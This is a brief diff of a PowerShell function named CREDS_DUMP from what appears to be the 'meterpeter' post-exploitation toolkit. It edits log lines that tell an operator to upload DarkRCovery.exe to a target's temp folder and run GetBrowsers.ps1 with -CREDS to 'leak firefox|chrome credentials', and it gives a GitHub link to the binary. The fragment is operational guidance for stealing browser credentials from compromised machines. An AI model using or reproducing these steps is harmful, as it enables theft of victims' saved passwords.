@@ -915,7 +915,7 @@ function CREDS_DUMP {
             cd $IPATH
         }
     }else{
-        echo "Upload: mimiRatz\DarkRCovery.exe to target `$env:TMP (:meterpeter> upload)" >> $LogFilePath\BrowserEnum.log
+        echo "Upload: meterpeter\mimiRatz\DarkRCovery.exe to target `$env:TMP" >> $LogFilePath\BrowserEnum.log
         echo "And Execute: [ ./GetBrowsers.ps1 -CREDS ] to leak firefox|chrome credentials" >> $LogFilePath\BrowserEnum.log
         echo "https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/DarkRCovery.exe" >> $LogFilePath\BrowserEnum.log
     }
